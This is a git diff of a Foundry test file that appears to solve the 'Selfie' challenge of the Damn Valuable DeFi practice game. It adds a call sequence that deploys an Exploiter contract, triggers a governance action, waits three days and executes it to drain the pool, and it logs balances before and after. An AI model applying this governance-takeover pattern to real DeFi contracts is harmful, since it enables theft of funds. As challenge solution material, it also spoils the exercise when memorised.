@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {Exploiter} from "../../../src/Contracts/selfie/Exploiter.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,6 +48,18 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        console.log("Balance of Pool : ", dvtSnapshot.balanceOf(address(selfiePool)));
+        console.log("Balance of Attacker : ", dvtSnapshot.balanceOf(address(attacker)));
+
+        vm.startPrank(attacker);
+        Exploiter exploit = new Exploiter(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
+        exploit.exploitGovernance();
+        vm.warp(block.timestamp + 3 days);
+        exploit.executeAction();
+        vm.stopPrank();
+
+        console.log("Balance of Pool : ", dvtSnapshot.balanceOf(address(selfiePool)));
+        console.log("Balance of Attacker : ", dvtSnapshot.balanceOf(address(attacker)));
 
         /**
          * EXPLOIT END *
